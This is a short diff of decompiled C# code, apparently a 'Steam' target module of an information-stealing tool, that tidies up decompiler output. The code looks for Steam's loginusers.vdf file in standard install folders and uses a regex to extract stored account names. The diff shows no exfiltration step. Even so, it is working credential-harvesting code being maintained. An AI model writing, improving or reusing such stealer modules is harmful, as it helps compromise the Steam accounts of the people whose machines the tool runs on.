@@ -117,12 +117,8 @@ public class Steam : ITarget
         Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), nameof (Steam), "config", "loginusers.vdf"),
         Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), nameof (Steam), "config", "loginusers.vdf")
       };
-      // ISSUE: reference to a compiler-generated field
-      // ISSUE: reference to a compiler-generated field
-      string path2 = ((IEnumerable<string>) source1).FirstOrDefault<string>(Steam.\u003C\u003EO.\u003C0\u003E__Exists ?? (Steam.\u003C\u003EO.\u003C0\u003E__Exists = new Func<string, bool>(File.Exists)));
-      // ISSUE: reference to a compiler-generated field
-      // ISSUE: reference to a compiler-generated field
-      string path3 = ((IEnumerable<string>) source2).FirstOrDefault<string>(Steam.\u003C\u003EO.\u003C0\u003E__Exists ?? (Steam.\u003C\u003EO.\u003C0\u003E__Exists = new Func<string, bool>(File.Exists)));
+      string path2 = ((IEnumerable<string>) source1).FirstOrDefault(File.Exists);
+      string path3 = ((IEnumerable<string>) source2).FirstOrDefault(File.Exists);
       if (path2 == null || path3 == null)
         return;
       string pattern1 = "\"AccountName\"\\s*\"([^\"]+)\"";
